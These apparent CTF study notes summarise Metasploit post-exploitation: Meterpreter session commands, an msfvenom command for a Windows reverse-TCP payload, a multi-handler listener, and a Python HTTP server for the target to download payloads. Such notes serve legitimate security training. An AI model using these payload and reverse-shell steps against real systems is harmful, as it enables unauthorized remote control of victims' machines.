# 🧠 Advanced CTF Exploitation Techniques

## NTLM Hash
A hash format used for Windows password storage. If obtained, it can be cracked or used with pass-the-hash attacks.

## Meterpreter Session
Once an exploit succeeds, you may get a Meterpreter shell:
```bash
sessions
sessions -i [id]
```

### Basic Meterpreter Commands
- `pwd`, `ls`, `cd`
- `download`, `upload`
- `shell` → drop to normal shell

## msfvenom
Tool to generate custom payloads.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your-ip] LPORT=4444 -f exe > shell.exe
```

## Multi-Handler Setup
1. Start listener in Metasploit:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [your-ip]
set LPORT 4444
run
```

2. Send or upload `shell.exe` to target.

## Simple HTTP Server for File Transfer
```bash
python3 -m http.server 8080
```

This lets the target download payloads using `wget` or `curl`.

---

This set of techniques completes the CTF simulation: scan → exploit → shell → post-exploitation.